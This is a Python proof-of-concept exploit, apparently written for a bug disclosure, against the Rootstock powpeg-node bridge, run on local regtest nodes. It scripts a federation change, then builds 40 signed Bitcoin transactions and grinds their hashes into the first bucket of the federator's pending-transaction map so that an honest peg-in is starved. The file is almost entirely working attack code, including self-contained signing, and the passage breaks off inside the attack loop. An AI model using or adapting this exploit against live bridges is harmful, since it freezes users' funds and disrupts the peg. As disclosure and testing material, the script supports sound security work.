#!/usr/bin/env python3
"""
End-to-end proof of the powpeg-node registerBtcTransaction starvation bug.

Nothing here is simulated. Every stage talks to a real bitcoind (regtest) and a
real rskj node over JSON-RPC, and every assertion is read back from the chain:

  federation  drive a REAL federation change (createFederation ->
              addFederatorPublicKeyMultikey x3 -> commitFederation) with 2-of-3
              votes, signed by the regtest authorizers auth-a and auth-b whose
              private keys are keccak256("auth-a"), keccak256("auth-b").
              -> a new federation becomes active and the old one becomes the
                 *retiring* federation for 150 blocks.

  attack      fan one real UTXO out into 40 P2PKH outputs, build 40 real
              Bitcoin transactions (real ECDSA, real sighash), grind each wtxid
              into bin 0 of the JVM pending-map, broadcast them, mine.
              Plus ONE honest peg-in from a separate "user" wallet, which is
              the victim.

  measure     read state back from rskj:
                eth_getBalance(victim)               == 0        (frozen)
                getBtcTxHashProcessedHeight(victim)  == -1       (never processed)
                getBtcTxHashProcessedHeight(attack)  == -1       (retry forever)
                number of registerBtcTransaction txs mined per block window

  recover     after the retiring federation expires, the same 40 transactions
              are accepted (they are ordinary peg-ins once the retiring
              federation is gone), the attacker is credited ~0.2 RBTC and the
              victim's peg-in finally lands.

Usage (run.sh does this for you):
    e2e.py federation
    e2e.py attack
    e2e.py measure  <label>
    e2e.py recover
"""

import base64
import hashlib
import hmac
import glob
import json
import os
import sys
import time
import urllib.request

# ---------------------------------------------------------------------------
# secp256k1 in pure Python.
#
# The PoC signs ~35k times while grinding (each attempt changes the sighash),
# so this is a fixed-base table plus RFC 6979 -- about 1 ms per signature and,
# unlike coincurve, it needs nothing beyond the standard library. The output is
# byte-for-byte what libsecp256k1 produces (verified: 50/50 signatures accepted
# by libsecp256k1, same low-S rule, same DER encoding).
# ---------------------------------------------------------------------------

_P = 2**256 - 2**32 - 977
_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


def _jac_dbl(p):
    x, y, z = p
    if y == 0 or z == 0:
        return (0, 0, 0)
    ysq = y * y % _P
    s = 4 * x * ysq % _P
    m = 3 * x * x % _P
    nx = (m * m - 2 * s) % _P
    ny = (m * (s - nx) - 8 * ysq * ysq) % _P
    return (nx, ny, 2 * y * z % _P)


def _jac_add(p, q):
    if p[2] == 0:
        return q
    if q[2] == 0:
        return p
    x1, y1, z1 = p
    x2, y2, z2 = q
    z1z1 = z1 * z1 % _P
    z2z2 = z2 * z2 % _P
    u1, u2 = x1 * z2z2 % _P, x2 * z1z1 % _P
    s1, s2 = y1 * z2 * z2z2 % _P, y2 * z1 * z1z1 % _P
    if u1 == u2:
        return _jac_dbl(p) if s1 == s2 else (0, 0, 0)
    h = (u2 - u1) % _P
    r = (s2 - s1) % _P
    hh = h * h % _P
    v = u1 * hh % _P
    nx = (r * r - h * hh - 2 * v) % _P
    ny = (r * (v - nx) - s1 * h * hh) % _P
    return (nx, ny, h * z1 * z2 % _P)


_G_TABLE = []
_p = (_GX, _GY, 1)
for _ in range(256):
    _G_TABLE.append(_p)
    _p = _jac_dbl(_p)


def _mul_g(k):
    acc = (0, 0, 0)
    i = 0
    while k:
        if k & 1:
            acc = _jac_add(acc, _G_TABLE[i])
        k >>= 1
        i += 1
    x, y, z = acc
    zi = pow(z, -1, _P)
    zi2 = zi * zi % _P
    return (x * zi2 % _P, y * zi2 * zi % _P)


def _rfc6979(priv, digest):
    v = b"\x01" * 32
    k = b"\x00" * 32
    seed = priv.to_bytes(32, "big") + (int.from_bytes(digest, "big") % _N).to_bytes(32, "big")
    k = hmac.new(k, v + b"\x00" + seed, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v + b"\x01" + seed, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    while True:
        v = hmac.new(k, v, hashlib.sha256).digest()
        cand = int.from_bytes(v, "big")
        if 1 <= cand < _N:
            yield cand
        k = hmac.new(k, v + b"\x00", hashlib.sha256).digest()
        v = hmac.new(k, v, hashlib.sha256).digest()


class _PublicKey:
    def __init__(self, priv):
        self._x, self._y = _mul_g(priv)

    def format(self, compressed=True):
        xb = self._x.to_bytes(32, "big")
        if compressed:
            return bytes([2 + (self._y & 1)]) + xb
        return b"\x04" + xb + self._y.to_bytes(32, "big")


class PrivateKey:
    """Drop-in for the two coincurve calls the PoC uses."""

    def __init__(self, raw):
        self.secret = int.from_bytes(raw, "big")
        self.public_key = _PublicKey(self.secret)

    def sign(self, digest, hasher=None):
        z = int.from_bytes(digest, "big")
        for k in _rfc6979(self.secret, digest):
            r = _mul_g(k)[0] % _N
            if r == 0:
                continue
            s = (pow(k, -1, _N) * (z + r * self.secret)) % _N
            if s == 0:
                continue
            if s > _N // 2:
                s = _N - s
            # raw r || s, exactly what coincurve returns; the caller appends
            # SIGHASH_ALL and the transaction serialiser DER-encodes it
            return r.to_bytes(32, "big") + s.to_bytes(32, "big")
        raise RuntimeError("unreachable")

# ---------------------------------------------------------------------------
# configuration
# ---------------------------------------------------------------------------

RSK_RPC = os.environ.get("RSK_RPC", "http://127.0.0.1:4444")
BTC_RPC = os.environ.get("BTC_RPC", "http://127.0.0.1:18443")
BTC_USER = os.environ.get("BTC_USER", "rsk")
BTC_PASS = os.environ.get("BTC_PASS", "rsk")
STATE_DIR = os.environ.get("E2E_STATE", os.path.expanduser("~/powpeg-e2e/state"))
STATE_FILE = os.path.join(STATE_DIR, "state.json")

BRIDGE = "0x0000000000000000000000000000000001000006"

MIN_PEGIN_SAT = 500_000          # rskj BridgeRegTestConstants.minimumPeginTxValue
RETIRING_SAT = 2_000             # above dust, far below the minimum
FANOUT_VALUE = 702_000           # per branch: 500k + 2k + dust + change + fee
ATTACK_COUNT = 40                # BtcToRskClient.MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN
BIN_BITS = 7                     # mask 0x7f: bin 0 for any ConcurrentHashMap table
                                 # up to 128 buckets (96 pending txs). Bit 0..6 of the
                                 # bucket index are zero, so *every* attack tx sorts
                                 # ahead of anything else in getTransactionProofs(),
                                 # which is a ConcurrentHashMap iterated bucket by
                                 # bucket. 1024 buckets (mask 0x3ff) costs 8x the
                                 # grinding for no benefit at this map size.
VICTIM_PEGIN_SAT = 1_000_000     # ordinary, above the minimum, valid
BTC_CONFIRMATIONS = 3            # btcs2RskMinimumAcceptableConfirmations (regtest)


# ---------------------------------------------------------------------------
# keccak256 (pure python; no external dependency)
# ---------------------------------------------------------------------------

_KECCAK_RC = [
    0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
    0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
    0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
    0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
    0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
    0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008,
]
_KECCAK_ROT = [
    [0, 36, 3, 41, 18], [1, 44, 10, 45, 2], [62, 6, 43, 15, 61],
    [28, 55, 25, 21, 56], [27, 20, 39, 8, 14],
]
_M64 = (1 << 64) - 1


def _rotl(x, n):
    return ((x << n) | (x >> (64 - n))) & _M64


def _keccak_f(state):
    for rnd in range(24):
        c = [state[x] ^ state[x + 5] ^ state[x + 10] ^ state[x + 15] ^ state[x + 20] for x in range(5)]
        d = [c[(x - 1) % 5] ^ _rotl(c[(x + 1) % 5], 1) for x in range(5)]
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] ^= d[x]
        b = [0] * 25
        for x in range(5):
            for y in range(5):
                b[y + 5 * ((2 * x + 3 * y) % 5)] = _rotl(state[x + 5 * y], _KECCAK_ROT[x][y])
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] = b[x + 5 * y] ^ ((~b[(x + 1) % 5 + 5 * y]) & b[(x + 2) % 5 + 5 * y])
        state[0] ^= _KECCAK_RC[rnd]
    return state


def keccak256(data: bytes) -> bytes:
    rate = 136
    pad = bytearray(data) + b"\x01"
    while len(pad) % rate != 0:
        pad += b"\x00"
    pad[-1] ^= 0x80
    state = [0] * 25
    for off in range(0, len(pad), rate):
        block = pad[off:off + rate]
        for i in range(rate // 8):
            state[i] ^= int.from_bytes(block[i * 8:(i + 1) * 8], "little")
        state = _keccak_f(state)
    out = b""
    for i in range(4):
        out += state[i].to_bytes(8, "little")
    return out


# ---------------------------------------------------------------------------
# json-rpc
# ---------------------------------------------------------------------------

def _post(url, payload, auth=None):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
    if auth:
        req.add_header("Authorization", "Basic " + base64.b64encode(auth.encode()).decode())
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())


def rpc(url, method, params=None, auth=None):
    res = _post(url, {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or []}, auth)
    if "error" in res and res["error"]:
        raise RuntimeError("%s: %s" % (method, res["error"]))
    return res.get("result")


def rsk(method, params=None):
    return rpc(RSK_RPC, method, params)


def btc(method, params=None):
    return rpc(BTC_RPC, method, params, auth="%s:%s" % (BTC_USER, BTC_PASS))


# ---------------------------------------------------------------------------
# ABI helpers (only what the Bridge needs)
# ---------------------------------------------------------------------------

def sel(sig: str) -> bytes:
    return keccak256(sig.encode())[:4]


def enc_uint(n: int) -> bytes:
    return n.to_bytes(32, "big", signed=False)


def enc_bytes(b: bytes) -> bytes:
    """ABI encoding of a single dynamic `bytes` argument (no other args)."""
    return enc_uint(32) + enc_uint(len(b)) + b + b"\x00" * ((32 - len(b) % 32) % 32)


def enc_bytes3(a: bytes, b: bytes, c: bytes) -> bytes:
    """ABI encoding of (bytes, bytes, bytes)."""
    def tail(x):
        return enc_uint(len(x)) + x + b"\x00" * ((32 - len(x) % 32) % 32)
    ta, tb, tc = tail(a), tail(b), tail(c)
    h = 32 * 3
    head = enc_uint(h) + enc_uint(h + len(ta)) + enc_uint(h + len(ta) + len(tb))
    return head + ta + tb + tc


def dec_uint(hexstr: str) -> int:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if not raw:
        return 0
    return int.from_bytes(raw[:32], "big", signed=False)


def dec_bytes(hexstr: str) -> bytes:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if len(raw) < 64:
        return b""
    off = int.from_bytes(raw[:32], "big")
    ln = int.from_bytes(raw[off:off + 32], "big")
    return raw[off + 32:off + 32 + ln]


def bridge_call(data: bytes) -> bytes:
    res = rsk("eth_call", [{"to": BRIDGE, "data": "0x" + data.hex()}, "latest"])
    return bytes.fromhex(res[2:] if res.startswith("0x") else res)


def bridge_tx(data: bytes, frm: str):
    return rsk("eth_sendTransaction", [{"from": frm, "to": BRIDGE, "data": "0x" + data.hex(), "gas": "0x7a120"}])


# ---------------------------------------------------------------------------
# keys
# ---------------------------------------------------------------------------

def key(seed: str) -> PrivateKey:
    """Same derivation rskj uses in GenNodeKeyId: priv = keccak256(seed)."""
    return PrivateKey(keccak256(seed.encode()))


def rsk_address(priv: PrivateKey) -> str:
    pub = priv.public_key.format(compressed=False)[1:]
    return "0x" + keccak256(pub)[-20:].hex()


def victim_rsk_address(priv: PrivateKey) -> str:
    """What the Bridge credits: RskAddress(ECKey.fromPublicOnly(btcPubKey).getAddress())."""
    return rsk_address(priv)


AUTH_A = key("auth-a")
AUTH_B = key("auth-b")
AUTH_C = key("auth-c")
FEDS = [key("e2e-fed-1"), key("e2e-fed-2"), key("e2e-fed-3")]
ATTACKER = key("e2e-attacker")
VICTIM = key("e2e-victim")


# ---------------------------------------------------------------------------
# bitcoin
# ---------------------------------------------------------------------------

def dsha(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def vi(n: int) -> bytes:
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + n.to_bytes(2, "little")
    if n <= 0xFFFFFFFF:
        return b"\xfe" + n.to_bytes(4, "little")
    return b"\xff" + n.to_bytes(8, "little")


def push(d: bytes) -> bytes:
    n = len(d)
    if n < 0x4C:
        return bytes([n]) + d
    return b"\x4c" + bytes([n]) + d


def p2pkh_script(pub_compressed: bytes) -> bytes:
    return b"\x76\xa9\x14" + hash160(pub_compressed) + b"\x88\xac"


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58check(payload: bytes, version: int) -> str:
    data = bytes([version]) + payload
    data += dsha(data)[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    return "1" * (len(data) - len(data.lstrip(b"\x00"))) + out


def p2pkh_address(pub_compressed: bytes) -> str:
    return b58check(hash160(pub_compressed), 111)   # 111 = regtest/testnet


def ser_tx(ins, outs, version=2, locktime=0):
    b = version.to_bytes(4, "little") + vi(len(ins))
    for txid, vout, script, seq in ins:
        b += txid + vout.to_bytes(4, "little") + vi(len(script)) + script + seq.to_bytes(4, "little")
    b += vi(len(outs))
    for value, spk in outs:
        b += value.to_bytes(8, "little") + vi(len(spk)) + spk
    return b + locktime.to_bytes(4, "little")


def sighash_all(prev_txid, prev_vout, prev_script, outs):
    return dsha(ser_tx([(prev_txid, prev_vout, prev_script, 0xFFFFFFFF)], outs) + (1).to_bytes(4, "little"))


def _der_int(v: int) -> bytes:
    b = v.to_bytes(32, "big").lstrip(b"\x00") or b"\x00"
    if b[0] & 0x80:
        b = b"\x00" + b
    return b"\x02" + bytes([len(b)]) + b


def der_sig(raw64: bytes) -> bytes:
    r = int.from_bytes(raw64[:32], "big")
    s = int.from_bytes(raw64[32:], "big")
    body = _der_int(r) + _der_int(s)
    return b"\x30" + bytes([len(body)]) + body


def sign_tx(priv: PrivateKey, prev_txid, prev_vout, prev_script, outs):
    digest = sighash_all(prev_txid, prev_vout, prev_script, outs)
    sig = der_sig(priv.sign(digest, hasher=None)) + b"\x01"
    pub = priv.public_key.format(True)
    script_sig = push(sig) + push(pub)
    raw = ser_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFF)], outs)
    return raw, dsha(raw)


def sha256hash_hashcode(d: bytes) -> int:
    return ((d[28] & 0xFF) << 24) | ((d[29] & 0xFF) << 16) | ((d[30] & 0xFF) << 8) | (d[31] & 0xFF)


def bin_index(d: bytes, mask: int) -> int:
    h = sha256hash_hashcode(d)
    return ((h ^ (h >> 16)) & 0x7FFFFFFF) & mask


# ---------------------------------------------------------------------------
# state
# ---------------------------------------------------------------------------

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {}


def save_state(st):
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(st, f, indent=2)


def _log_files():
    """Every log this run produced: rsk.log holds the node's own logback output,
    powpeg-<generator>.log holds the JVM's stdout/stderr."""
    d = os.environ.get("E2E_LOGS", "")
    files = [os.path.join(d, "rsk.log")]
    try:
        files += sorted(glob.glob(os.path.join(d, "powpeg-*.log")))
    except Exception:
        pass
    return [f for f in files if os.path.exists(f)]


LOG_FILES = _log_files()


def bridge_log_tail(n=25, pattern=r"voteFederationChange|createPendingFederation|addFederator|commitFederation|amAwaiting|Bridge|ERROR"):
    """The node's own account of what the Bridge did with our votes."""
    import re
    rx = re.compile(pattern)
    for path in LOG_FILES:
        if not os.path.exists(path):
            continue
        try:
            with open(path, errors="replace") as f:
                lines = [l for l in f if rx.search(l)]
        except (OSError, UnicodeError):
            continue
        if lines:
            print("  --- %s (filtered) ---" % os.path.basename(path))
            for line in lines[-n:]:
                print("    " + line.rstrip()[:220])


def log(msg):
    print(msg, flush=True)


def wait_rsk_tx(txhash, timeout=60):
    end = time.time() + timeout
    while time.time() < end:
        r = rsk("eth_getTransactionReceipt", [txhash])
        if r:
            return r
        time.sleep(1)
    raise RuntimeError("timeout waiting for rsk tx " + txhash)


# FederationChangeResponseCode, rskj 1e95a3b
FED_CODE = {
    1: "SUCCESSFUL",
    -1: "FEDERATION_NON_EXISTENT / PENDING_FEDERATION_ALREADY_EXISTS",
    -2: "INSUFFICIENT_MEMBERS / EXISTING_FEDERATION_AWAITING_ACTIVATION",
    -3: "RETIRING_FEDERATION_ALREADY_EXISTS / PENDING_FEDERATION_MISMATCHED_HASH",
    -4: "PROPOSED_FEDERATION_ALREADY_EXISTS",
    -10: "UNAUTHORIZED_CALLER / GENERIC_ERROR",
}


def vote_dry_run(data: bytes, frm: str) -> int:
    """eth_call the same vote; the Bridge runs its dry run path and returns the code."""
    raw = bytes.fromhex(rsk("eth_call", [{"from": frm, "to": BRIDGE,
                                          "data": "0x" + data.hex()}, "latest"])[2:])
    if len(raw) < 32:
        return -999
    v = int.from_bytes(raw[:32], "big")
    return v - (1 << 256) if v >= (1 << 255) else v


def pending_hash() -> bytes:
    return dec_bytes("0x" + bridge_call(sel("getPendingFederationHash()")).hex())


def pending_size() -> int:
    return int.from_bytes(bridge_call(sel("getPendingFederationSize()"))[:32], "big")


def active_address() -> str:
    return dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode(errors="ignore")


def retiring_address() -> str:
    return dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")


# ---------------------------------------------------------------------------
# stage: federator liveness
# ---------------------------------------------------------------------------

FEDERATOR_PATTERN = (
    r"checkFederateRequirements|Federator is disabled|Could not validate fed node requirements"
    r"|validFederator|Cannot connect to Bitcoin node|No Bitcoin [Pp]eers"
    r"|not part of the federation|Starting for federation|watching federation"
    r"|triggerClientChange|Bitcoin peer|logBestChainHeight|checkPeers"
    r"|Error while reading key file|KeyFileHandler"
)


def federator_check(gen, need_height=True, timeout=120):
    """Prove the federator inside the RSK node is actually running.

    FedNodeRunner.run() gives up silently when checkFederateRequirements() fails:

        if (!this.checkFederateRequirements()) {
            logger.error("[run] Could not validate fed node requirements");
            return;                       // <-- no federator, node keeps running
        }

    The node then serves RPC and mines perfectly while never sending a single
    updateCollections / receiveHeaders, so getBtcBlockchainBestChainHeight()
    stays at 0 and the federator's RSK nonce stays at 0. The PoC would appear to
    "work" (nothing ever gets processed) while proving nothing at all, so this
    has to be checked before anything expensive happens.
    """
    addr = rsk_address(key(gen))
    log("[federator] checking that '%s' (%s) is alive" % (gen, addr[:10]))
    h0 = btc_best_chain_height()
    n0 = int(rsk("eth_getTransactionCount", [addr, "latest"]), 16)
    log("             start: bridge BTC height %d, nonce %d" % (h0, n0))

    end = time.time() + timeout
    h, n = h0, n0
    while time.time() < end:
        time.sleep(5)
        try:
            h = btc_best_chain_height()
            n = int(rsk("eth_getTransactionCount", [addr, "latest"]), 16)
        except Exception:
            continue
        if n > n0 and (h > h0 or not need_height):
            log("             alive: nonce %d -> %d, bridge BTC height %d -> %d"
                % (n0, n, h0, h))
            return True
        if int(time.time()) % 20 < 6:
            log("             waiting: nonce %d (sent %d), bridge BTC height %d (from %d)"
                % (n, n - n0, h, h0))

    bridge_log_tail(30, FEDERATOR_PATTERN)
    raise RuntimeError(
        "the federator inside the RSK node is NOT running (nonce %d after %ds, "
        "bridge BTC height %d).\n"
        "  FedNodeRunner.run() returns early when checkFederateRequirements() fails,\n"
        "  leaving a fully working RSK node with no federator at all.\n"
        "  the lines above say which requirement failed." % (n, timeout, h))


# ---------------------------------------------------------------------------
# stage: federation
# ---------------------------------------------------------------------------

def stage_federation():
    st = load_state()

    # createPendingFederation has four guards: a pending federation exists (-1),
    # a proposed one exists (-4, only possible with RSKIP419), a federation is
    # still awaiting activation (-2, needs both a "new" and an "old" federation in
    # storage) and a retiring federation exists (-3). On a fresh chain neither the
    # new nor the old federation slot is populated (FederationStorageProviderImpl
    # reads them straight from storage, there is no genesis fallback), so none of
    # the four applies and the vote can run on the very first blocks. Only wait
    # for the chain to be alive.
    log("[federation] waiting for the chain to produce a few blocks")
    end = time.time() + 300
    while time.time() < end:
        blk = int(rsk("eth_blockNumber"), 16)
        if blk >= 3:
            break
        time.sleep(2)
    else:
        raise RuntimeError("the chain did not produce blocks")
    log("             block %d" % int(rsk("eth_blockNumber"), 16))

    log("[federation] current federation")
    size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    addr_before = dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode()
    log("             size=%d address=%s" % (size, addr_before))

    a = rsk_address(AUTH_A)
    b = rsk_address(AUTH_B)
    c = rsk_address(AUTH_C)
    log("[federation] authorizers: %s %s %s" % (a[:10], b[:10], c[:10]))
    wallet_accounts = [x.lower() for x in (rsk("eth_accounts") or [])]
    for who, k in (("auth-a", a), ("auth-b", b), ("auth-c", c)):
        present = "in wallet" if k.lower() in wallet_accounts else "NOT IN WALLET"
        log("             %s %s" % (who, present))

    def send_vote(data, who, k):
        """One real vote. Returns True when the transaction was mined."""
        code = vote_dry_run(data, k)
        if code != 1:
            bridge_log_tail()
            raise RuntimeError("vote dry run rejected for %s: code %d (%s)"
                               % (who, code, FED_CODE.get(code, "unknown")))
        txh = bridge_tx(data, k)
        rc = wait_rsk_tx(txh, timeout=120)
        sender = (rc.get("from") or "").lower()
        if sender and sender != k.lower():
            raise RuntimeError("tx signed by %s but %s was requested" % (sender, who))
        if rc.get("status") not in ("0x1", 1, True):
            raise RuntimeError("vote from %s reverted: %s" % (who, rc))
        log("             %s voted (%s)" % (who, txh[:18]))
        return True

    def vote_round(data, effect, label):
        """Vote until `effect` is observed. A round needs 2 of the 3 authorizers,
        and the Bridge only executes a winner once the majority is reached, so
        the outcome -- not the return code -- decides whether we are done."""
        if effect():
            return True
        for who, k in (("auth-a", a), ("auth-b", b), ("auth-c", c)):
            send_vote(data, who, k)
            for _ in range(15):
                if effect():
                    return True
                time.sleep(1)
        bridge_log_tail()
        return False

    # Every round is decided by the observed outcome, never by a return code:
    # createFederation/addFederatorPublicKeyMultikey report the dry-run result,
    # and the winning (non-dry) execution is a different code path.
    log("[federation] createFederation")
    if not vote_round(sel("createFederation()"), lambda: pending_hash() != b"", "create"):
        raise RuntimeError("createFederation produced no pending federation")
    log("             pending federation exists, size %d" % pending_size())

    log("[federation] addFederatorPublicKeyMultikey x%d" % len(FEDS))
    for i, k in enumerate(FEDS, start=1):
        btc_pub = k.public_key.format(True)      # 33 bytes, compressed
        ec_pub = k.public_key.format(False)      # 65 bytes, uncompressed
        data = sel("addFederatorPublicKeyMultikey(bytes,bytes,bytes)") + enc_bytes3(btc_pub, ec_pub, ec_pub)
        want = i
        ok = vote_round(data, lambda w=want: pending_size() >= w, "add %d" % i)
        if not ok:
            raise RuntimeError("federator %d was not added" % i)
        log("             %s added, pending federation size %d" % (rsk_address(k)[:10], pending_size()))

    pend = pending_hash()
    if not pend:
        bridge_log_tail()
        raise RuntimeError("the pending federation disappeared before commit")
    log("[federation] pending federation hash 0x%s" % pend.hex())

    log("[federation] commitFederation")
    # A successful commit clears the pending federation; the *active* one only
    # changes 150 blocks later (federationActivationAge), which is the wait below.
    if not vote_round(sel("commitFederation(bytes)") + enc_bytes(pend),
                      lambda: pending_hash() == b"", "commit"):
        raise RuntimeError("commitFederation did not clear the pending federation")
    log("             committed; the new federation activates in 150 blocks")

    # With RSKIP419 active the commit only stores a *proposed* federation
    # (FederationSupportImpl.commitPendingFederation) and the handover waits for
    # an SVP cycle that a voting round can never complete. That state is easy to
    # detect, and it would otherwise show up as a silent 15 minute timeout.
    proposed = 0
    try:
        proposed = dec_uint("0x" + bridge_call(sel("getProposedFederationSize()")).hex())
    except Exception:
        pass
    if proposed:
        bridge_log_tail()
        raise RuntimeError(
            "the commit produced a PROPOSED federation (size %d), not a handover: "
            "RSKIP419 is active on this chain.\n"
            "  -> $WORK/powpeg.conf must contain blockchain.config.consensusRules.rskip419 = -1\n"
            "  -> and the node must be started with a fresh database (./e2e/run.sh --keep off)" % proposed)
    log("             no proposed federation: the handover was direct (RSKIP419 inactive)")

    log("[federation] waiting for the new federation to activate (150 blocks)")
    end = time.time() + 900
    retiring = ""
    last_print = 0
    while time.time() < end:
        raw = retiring_address()
        if raw:
            retiring = raw
            break
        now = time.time()
        if now - last_print > 20:
            last_print = now
            try:
                blk = int(rsk("eth_blockNumber"), 16)
                act = active_address()
                log("             block %d, active=%s, retiring=<not yet>" % (blk, act))
            except Exception:
                pass
        time.sleep(2)
    if not retiring:
        raise RuntimeError("the retiring federation never appeared; the change did not go through")

    new_addr = active_address()
    new_size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    log("[federation] ACTIVE   %s (size %d)" % (new_addr, new_size))
    log("[federation] RETIRING %s   <-- the old federation, still live" % retiring)

    if not new_addr or new_addr == addr_before:
        raise RuntimeError("active federation address did not change")

    st.update({
        "active_address": new_addr,
        "retiring_address": retiring,
        "old_address": addr_before,
        "fed_size": new_size,
    })
    save_state(st)

    log("[federation] the window is open: the retiring federation stays live for")
    log("             150 blocks after activation, plus 150 more of migration")


# ---------------------------------------------------------------------------
# stage: attack
# ---------------------------------------------------------------------------

def btc_confirmations(txid):
    try:
        return btc("getrawtransaction", [txid, True])["confirmations"]
    except Exception:
        return 0


def mine(n):
    addr = btc("getnewaddress", ["", "legacy"])
    btc("generatetoaddress", [n, addr])
    return addr


def fund_address(addr, amount_btc, spk_hex):
    """Send `amount_btc` to `addr`, mine it, and return the exact outpoint.

    listunspent cannot be used for these addresses: bitcoind only reports UTXOs
    whose key it holds, and the PoC signs with its own keys, so the output is
    invisible to the wallet even though the tx is a wallet tx. -txindex gives us
    the vout directly.
    """
    txid = btc("sendtoaddress", [addr, amount_btc])
    mine(1)
    raw = btc("getrawtransaction", [txid, True])
    want = int(round(amount_btc * 1e8))
    for out in raw.get("vout", []):
        spk = ((out.get("scriptPubKey") or {}).get("hex") or "").lower()
        if spk == spk_hex.lower() and int(round(out["value"] * 1e8)) == want:
            return txid, out["n"], want
    raise RuntimeError(
        "tx %s has no %d sat output paying %s (vouts: %s)"
        % (txid, want, addr, [(o["n"], o["value"]) for o in raw.get("vout", [])]))


def btc_best_chain_height() -> int:
    raw = bridge_call(sel("getBtcBlockchainBestChainHeight()"))
    return int.from_bytes(raw[:32], "big")


def stage_attack():
    st = load_state()

    # RSK block production is deliberately NOT paused here. registerBtcTransaction
    # only takes effect in a mined RSK block, and the Bridge only accepts a peg-in
    # once it knows that Bitcoin block's header (fed by the federator, 25 headers
    # per turn), so the chain has to keep producing blocks while the flood is set
    # up. The whole stage is kept well inside the retiring-federation window: the
    # window is 150 blocks (FederationRegTestConstants), one block per second, and
    # this stage spends ~10 s grinding + ~20 blocks catching up the Bridge.
    log("[attack] the retiring federation window is open; the clock is running")
    active = st["active_address"]
    retiring = st["retiring_address"]
    log("[attack] active   %s" % active)
    log("[attack] retiring %s" % retiring)

    def address_script(addr):
        """Both federation addresses are P2SH; bitcoind can hand back the script."""
        for method in ("getaddressinfo", "validateaddress"):
            try:
                info = btc(method, [addr])
            except Exception:
                continue
            spk = info.get("scriptPubKey")
            if spk:
                return bytes.fromhex(spk)
        raise RuntimeError("could not resolve %s to a scriptPubKey" % addr)

    spk_active = address_script(active)
    spk_retiring = address_script(retiring)
    log("[attack] active scriptPubKey   %s%s" % (spk_active.hex()[:24], "..."))
    log("[attack] retiring scriptPubKey %s%s" % (spk_retiring.hex()[:24], "..."))

    # ---- fund the attacker wallet -------------------------------------
    attacker_addr = p2pkh_address(ATTACKER.public_key.format(True))
    prev_script = p2pkh_script(ATTACKER.public_key.format(True))
    if "attack_funding" not in st:
        txid, vout, sat = fund_address(attacker_addr, 0.8, prev_script.hex())
        st["attack_funding"] = {"txid": txid, "vout": vout, "sat": sat}
        save_state(st)
        log("[attack] funded attacker %s with %.8f BTC (%s:%d)"
            % (attacker_addr, sat / 1e8, txid[:18], vout))
    fu = st["attack_funding"]
    prev_txid = bytes.fromhex(fu["txid"])[::-1]

    # ---- fan out one UTXO into 40 branches -----------------------------
    if "funding_txid" not in st:
        outs = [(FANOUT_VALUE, prev_script)] * ATTACK_COUNT
        total = FANOUT_VALUE * ATTACK_COUNT
        fee = 2_000 + ATTACK_COUNT * 34
        change = fu["sat"] - total - fee
        outs.append((change, prev_script))
        raw, txid = sign_tx(ATTACKER, prev_txid, fu["vout"], prev_script, outs)
        btc("sendrawtransaction", [raw.hex()])
        mine(1)
        log("[attack] fan-out tx %s -> %d x %d sat" % (txid[::-1].hex(), ATTACK_COUNT, FANOUT_VALUE))
        st["funding_txid"] = txid[::-1].hex()
        save_state(st)
    funding_txid = bytes.fromhex(st["funding_txid"])[::-1]

    # ---- build + grind + broadcast the 40 attack transactions ----------
    mask = (1 << BIN_BITS) - 1
    attack = []
    for i in range(ATTACK_COUNT):
        attempts = 0
        while True:
            attempts += 1
            dust = 546 + ((i * 7919 + attempts * 40503) % 60_000)
            change = FANOUT_VALUE - MIN_PEGIN_SAT - RETIRING_SAT - dust - 1_200
            outs = [
                (MIN_PEGIN_SAT, spk_active),
                (RETIRING_SAT, spk_retiring),
                (dust, prev_script),
                (change, prev_script),
            ]
            raw, txid = sign_tx(ATTACKER, funding_txid, i, prev_script, outs)
            if bin_index(txid, mask) == 0:
                break
        # the 40 outputs of the fan-out are vout 0..39
        btc("sendrawtransaction", [raw.hex()])
        attack.append({"txid": txid[::-1].hex(), "attempts": attempts})
        if (i + 1) % 10 == 0:
